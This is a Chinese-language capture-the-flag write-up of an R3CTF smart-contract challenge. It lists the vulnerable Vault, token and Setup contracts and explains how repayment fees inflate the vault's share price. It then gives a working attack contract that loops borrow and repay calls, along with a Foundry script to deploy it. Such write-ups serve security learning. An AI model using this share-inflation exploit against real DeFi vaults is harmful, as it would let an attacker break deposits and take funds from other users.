# R3CTF 复现

题目合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";
import {LING} from "./LING.sol";

contract Vault is Ownable, IERC4626, ERC20("LING VAULT", "vLING") {
    struct VaultAccount {
        uint256 amount;
        uint256 shares;
    }

    VaultAccount public totalAsset;
    LING ling;
    mapping(address => uint256) public borrowedAssets;
    uint256 public totalBorrowedAssets;

    constructor(LING _ling) Ownable(msg.sender) {
        ling = _ling;
    }

    function asset() external view returns (address assetTokenAddress) {
        assetTokenAddress = address(ling);
    }

    function totalAssets() public view returns (uint256 totalManagedAssets) {
        totalManagedAssets = totalAsset.amount - totalBorrowedAssets;
    }

    function convertToShares(
        uint256 assets
    ) public view returns (uint256 shares) {
        if (totalAsset.amount == 0) {
            shares = assets;
        } else {
            shares = (assets * totalAsset.shares) / totalAsset.amount;
        }
    }

    function convertToAssets(
        uint256 shares
    ) public view returns (uint256 assets) {
        if (totalAsset.shares == 0) {
            assets = shares;
        } else {
            assets = (shares * totalAsset.amount) / totalAsset.shares;
        }
    }

    function maxDeposit(
        address /* receiver */
    ) public pure returns (uint256 maxAssets) {
        return type(uint256).max;
    }

    function previewDeposit(
        uint256 assets
    ) external view returns (uint256 shares) {
        shares = convertToShares(assets);
    }

    function deposit(
        uint256 assets,
        address receiver
    ) external returns (uint256) {
        if (assets == 0) {
            revert("zero assets");
        }
        uint256 shares = convertToShares(assets);

        totalAsset.amount += assets;
        totalAsset.shares += shares;
        ling.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);

        emit Deposit(msg.sender, receiver, assets, shares);
        return shares;
    }

    function maxMint(
        address /* receiver */
    ) external pure returns (uint256 maxShares) {
        return type(uint256).max;
    }

    function previewMint(
        uint256 shares
    ) external view returns (uint256 assets) {
        assets = convertToAssets(shares);
    }

    function mint(
        uint256 shares,
        address receiver
    ) external returns (uint256 assets) {
        if (shares == 0) {
            revert("zero shares");
        }
        assets = convertToAssets(shares);

        totalAsset.amount += assets;
        totalAsset.shares += shares;
        ling.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);

        emit Deposit(msg.sender, receiver, assets, shares);
        return assets;
    }

    function maxWithdraw(
        address owner
    ) external view returns (uint256 maxAssets) {
        uint256 shares = balanceOf(owner);
        maxAssets = convertToAssets(shares);
    }

    function previewWithdraw(
        uint256 assets
    ) external view returns (uint256 shares) {
        shares = convertToShares(assets);
    }

    function withdraw(
        uint256 assets,
        address receiver,
        address owner
    ) external returns (uint256 shares) {
        if (assets == 0) {
            revert("zero assets");
        }
        shares = convertToShares(assets);
        if (shares > balanceOf(owner)) {
            revert("insufficient shares");
        }

        if (msg.sender != owner) {
            uint256 allowed = allowance(owner, msg.sender);
            if (allowed < shares) {
                revert("insufficient allowance");
            }
            _approve(owner, msg.sender, allowed - shares);
        }

        _burn(owner, shares);
        totalAsset.amount -= assets;
        totalAsset.shares -= shares;
        ling.transfer(receiver, assets);

        emit Withdraw(msg.sender, receiver, owner, assets, shares);
        return shares;
    }

    function maxRedeem(
        address owner
    ) external view returns (uint256 maxShares) {
        return balanceOf(owner);
    }

    function previewRedeem(
        uint256 shares
    ) external view returns (uint256 assets) {
        assets = convertToAssets(shares);
    }

    function redeem(
        uint256 shares,
        address receiver,
        address owner
    ) external returns (uint256 assets) {
        if (shares > balanceOf(owner)) {
            revert("insufficient shares");
        }
        assets = convertToAssets(shares);

        if (msg.sender != owner) {
            uint256 allowed = allowance(owner, msg.sender);
            if (allowed < shares) {
                revert("insufficient allowance");
            }
            _approve(owner, msg.sender, allowed - shares);
        }

        _burn(owner, shares);
        totalAsset.amount -= assets;
        totalAsset.shares -= shares;
        ling.transfer(receiver, assets);

        emit Withdraw(msg.sender, receiver, owner, assets, shares);
        return assets;
    }
//借钱合约
    function borrowAssets(uint256 amount) external {
        if (amount == 0) {
            revert("zero amount");
        }
        if (amount > totalAssets()) {
            revert("insufficient balance");
        }
        borrowedAssets[msg.sender] += amount;
        totalBorrowedAssets += amount;
        ling.transfer(msg.sender, amount);
    }
//还钱合约
    function repayAssets(uint256 amount) external {
        if (amount == 0) {
            revert("zero amount");
        }
        if (borrowedAssets[msg.sender] < amount) {
            revert("invalid amount");
        }
        uint256 fee = (amount * 1) / 100;
        borrowedAssets[msg.sender] -= amount;
        totalBorrowedAssets -= amount;
        totalAsset.amount += fee; //fee计入资产中
        ling.transferFrom(msg.sender, address(this), amount + fee);
    }
}
```

| 变量 | 说明 |
| --- | --- |
| `totalAsset.amount` | 金库当前总资产数量（包括用户存的、手续费、借款未还的等） |
| `totalAsset.shares` | 金库发行出的总份额数量（vLING 代币总供应） |
| `borrowedAssets[msg.sender]` | 某人借出去的资产数量 |
| `totalBorrowedAssets` | 当前所有人一共借了多少资产 |
| `balanceOf(user)` | 用户拥有的份额数量（vLING） |

可以看到其中有借钱函数`borrowAssets`:不满足两个if条件,就会将`borrowedAssets[msg.sender]`和`totalBorrowedAssets`记录加上amount这么多,然后给`msg.sender`转amount钱

借钱后金库总资产不变,只是净资产减少了amount

还有还钱函数`repayAssets`,不满足两个if条件之后,就计算手续费`fee`,`fee`计入总资产`totalAsset`,然后`msg.sender`转入`amount+fee`这么多的钱,这时候可以看到金库的总资产增加了`fee`这么多,但是份额不变,所以通货膨胀,也就是每一个份额变得更值钱了

由此,可以通过借还循环使得更加膨胀,最终让总额增加数量达到条件的999eth即可

```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract LING is ERC20 {
    constructor(uint256 _initialSupply) ERC20("LING", "LING") {
        _mint(msg.sender, _initialSupply);
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Vault} from "./Vault.sol";
import {LING} from "./LING.sol";
//0x5FbDB2315678afecb367f032d93F642f64180aa3

contract Setup {
    Vault public vault;
    LING public ling;
    bool public claimed;
    bool public solved;

    constructor() {
        ling = new LING(1000 ether);
        vault = new Vault(ling);
    }

    function claim() external {
        if (claimed) {
            revert("Already claimed");
        }
        claimed = true;
        ling.transfer(msg.sender, 1 ether);
    }

    function solve() external {
        ling.approve(address(vault), 999 ether); // 授权
        vault.deposit(999 ether, address(this)); //  存钱
        if (vault.balanceOf(address(this)) >= 500 ether) {
            revert("Challenge not solved yet"); //
        }
        solved = true;
    }

    function isSolved() public view returns (bool) {
        return solved;
    }
}
```

```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {Setup} from "src/Setup.sol";

contract Deploy is Script {
    function run() public {
        vm.startBroadcast();
        Setup _setup = new Setup();
        vm.stopBroadcast();
    }
}
```

## 攻击合约

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {LING} from "./LING.sol";
import {Setup} from "../src/Setup.sol";
import {Vault} from "../src/Vault.sol";

contract Attack {
    Setup public setup;
    Vault public vault;
    LING public ling;

    constructor(address addr) {
        setup = Setup(addr);
        vault = setup.vault();
        ling = setup.ling();
    }

    function attack() external {
        setup.claim();
        ling.approve(address(vault), type(uint256).max);
        vault.deposit(0.01 ether, address(this)); //存入0.01 获得shares
        // uint256 share = vault.balanceOf(address(this));//返回shares
        uint256 currentAssets = vault.totalAssets();
        // uint256 fee = (currentAssets * 1) / 100;
        for (uint256 i = 0; i < 100; i++) {
            vault.borrowAssets(currentAssets);

            vault.repayAssets(currentAssets);
        }
        setup.solve();
        require(setup.isSolved(), "fail");
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(0x5FbDB2315678afecb367f032d93F642f64180aa3);
        attack.attack();
        vm.stopBroadcast();
    }
}

```


> 更新: 2025-12-18 13:03:09  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/bsnb0v9yqztdihg3>